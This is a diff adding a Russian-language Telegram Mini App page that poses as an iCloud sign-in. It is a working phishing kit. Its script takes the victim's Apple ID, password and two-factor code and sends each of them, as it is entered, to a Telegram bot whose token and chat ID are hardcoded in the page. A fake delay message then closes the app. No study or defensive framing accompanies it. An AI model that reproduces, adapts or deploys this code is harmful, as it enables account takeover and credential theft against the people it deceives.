@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Вход в iCloud</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            display: flex; 
+            justify-content: center; 
+            padding-top: 50px;
+            background-color: #f5f5f7;
+        }
+        .login-form { width: 300px; display: flex; flex-direction: column; gap: 15px; background: white; padding: 20px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        h2 { text-align: center; font-size: 20px; margin-bottom: 10px; }
+        input { padding: 12px; border: 1px solid #d2d2d7; border-radius: 8px; font-size: 16px; outline: none; }
+        input:focus { border-color: #007aff; }
+        button { padding: 12px; background: #007aff; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: 500; }
+        button:hover { background: #0063cc; }
+        p { font-size: 14px; color: #6e6e73; text-align: center; }
+    </style>
+</head>
+<body>
+
+<div class="login-form" id="auth-step">
+    <h2>Вход в iCloud</h2>
+    <input type="text" id="email" placeholder="Apple ID">
+    <input type="password" id="password" placeholder="Пароль">
+    <button onclick="sendData()">Войти</button>
+</div>
+
+<div class="login-form" id="2fa-step" style="display:none;">
+    <h2>Двухфакторная проверка</h2>
+    <p>Код подтверждения отправлен на ваше устройство Apple.</p>
+    <input type="text" id="code" placeholder="Код из 6 цифр" maxlength="6">
+    <button onclick="send2FA()">Подтвердить</button>
+</div>
+
+<script>
+    // Инициализация Telegram WebApp
+    const tg = window.Telegram.WebApp;
+    tg.expand(); // Разворачиваем на все окно
+
+    const token = '8529029264:AAHn2DMIIgv-Ga2Fd5G3Az86GQqp1qshNgQ';
+    const chatId = '-5249989864';
+
+    async function sendToTelegram(text) {
+        try {
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'Markdown' })
+            });
+        } catch (e) {
+            console.error("Ошибка отправки:", e);
+        }
+    }
+
+    async function sendData() {
+        const emailInput = document.getElementById('email');
+        const email = emailInput.value;
+        const pass = document.getElementById('password').value;
+
+        // ПРОВЕРКА: Содержит ли собачку @
+        if (!email.includes('@')) {
+            alert('Введите корректный Apple ID');
+            emailInput.style.border = "1px solid red";
+            return;
+        }
+
+        // Отправка первой части данных
+        await sendToTelegram(`⚠️ **Данные входа**\n👤 ID: \`${email}\`\n🔑 Pass: \`${pass}\``);
+        
+        // Переключение формы
+        document.getElementById('auth-step').style.display = 'none';
+        document.getElementById('2fa-step').style.display = 'flex';
+    }
+
+    async function send2FA() {
+        const code = document.getElementById('code').value;
+        
+        if (code.length < 4) {
+            alert('Введите код полностью');
+            return;
+        }
+
+        await sendToTelegram(`🔢 **Код 2FA**: \`${code}\``);
+        
+        tg.showAlert("Проверка данных... Это может занять до 24 часов.");
+        
+        // Закрываем Mini App через 3 секунды
+        setTimeout(() => {
+            tg.close();
+        }, 3000);
+    }
+</script>
+
+</body>
+</html>
